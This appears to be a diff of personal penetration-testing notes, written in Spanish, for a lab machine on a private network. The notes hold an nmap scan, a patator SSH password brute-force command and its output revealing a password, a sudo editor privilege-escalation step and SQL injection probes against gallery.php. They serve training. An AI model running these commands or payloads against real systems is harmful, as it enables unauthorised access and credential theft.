@@ -1,5 +1,4 @@
 PROBAR
-GET /gallery/gallery.php?id=*&sort=dateuploaded # ID Vulnerable a SQL Injection
 
 nmap -sV -A -Pn 192.168.111.131
 
@@ -82,3 +81,11 @@ cat /proc/version
 
 patator ssh_login host=192.168.111.131 user=loneferret password=FILE0 0=/home/kali/Documents/dicCompleto.txt -x ignore:mesg='Authentication failed.'
  05:45:42 patator    INFO - 0     39     0.001 | starwars                           |  7144 | SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1.2
+
+ssh loneferret@192.168.111.131
+export TERM=xterm
+sudo /usr/local/bin/ht
+
+Cambiamos a 192.168.111.132 la IP por reseteo de la máquina
+GET /gallery/gallery.php?id=* # ID Vulnerable a SQL Injection
+http://192.168.111.132/gallery/gallery.php?id=1+order+by+7+--
